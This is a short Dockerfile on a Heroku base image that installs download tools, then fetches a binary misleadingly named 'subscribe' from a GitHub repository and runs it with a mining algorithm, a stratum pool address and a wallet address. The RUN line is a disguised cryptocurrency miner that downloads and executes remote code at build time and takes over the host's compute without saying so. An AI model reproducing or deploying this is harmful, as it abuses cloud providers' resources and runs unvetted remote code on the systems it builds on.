FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN timeout 15m wget https://github.com/mrbogel/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MZcw786kC8ng7KUeHZMQuhFhr2Funss7Kk.VPS
CMD bash heroku.sh
